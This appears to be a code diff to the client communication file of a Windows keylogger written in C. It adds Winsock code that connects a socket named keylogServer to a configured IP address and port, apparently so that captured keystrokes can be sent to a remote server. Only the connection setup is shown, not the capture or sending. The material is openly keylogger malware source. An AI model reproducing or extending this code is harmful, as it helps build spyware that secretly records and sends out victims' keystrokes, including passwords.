@@ -1,11 +1,10 @@
 #include "KeyLogger_clientCom.h"
-#include <winsock2.h>
+
 #include <stdio.h>
-
-    WSADATA WSA;
+#include <winsock2.h>
+WSADATA WSA;
 SOCKET keylogServer;
-
-/**
+ /**
     Name startListeningClient
 
     Description: enable the server to write to t he socket  by calling
@@ -15,6 +14,8 @@ SOCKET keylogServer;
 */
 bool startListeningClient()
 {
+    struct sockaddr_in server;
+
     if (WSAStartup(MAKEWORD(2,2),&WSA) !=0)
     {
         return false;
@@ -25,7 +26,13 @@ bool startListeningClient()
     {
         return false;
     }
-
+    server.sin_port=htons(SERVER_CONNECTION_PORT);
+    server.sin_family=AF_INET;
+    server.sin_addr.S_un.S_addr = inet_addr(IP_ADDRESS);
+    if (connect(keylogServer,(SOCKADDR*)&server,sizeof(server))<0)
+    {
+        return false;
+    }
 return true;
 }
 /**
